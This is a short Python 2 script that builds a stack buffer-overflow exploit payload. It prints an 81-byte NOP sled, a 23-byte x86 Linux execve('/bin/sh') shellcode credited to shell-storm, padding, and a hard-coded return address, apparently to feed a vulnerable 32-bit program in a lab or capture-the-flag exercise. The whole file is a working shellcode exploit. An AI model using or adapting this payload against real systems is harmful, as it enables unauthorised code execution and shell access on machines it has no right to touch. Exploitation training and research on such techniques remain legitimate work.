#!/usr/bin/python

# execve("/bin/sh", ["/bin/sh", NULL]) without RTF-header - 23 bytes
# https://shell-storm.org/shellcode/files/shellcode-224.html

# little-endian
addr = "\x68\xf6\xff\xbf"
nopsled = "\x90" * 81
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
padding = "\x90" * 36

print nopsled + shellcode + padding + addr
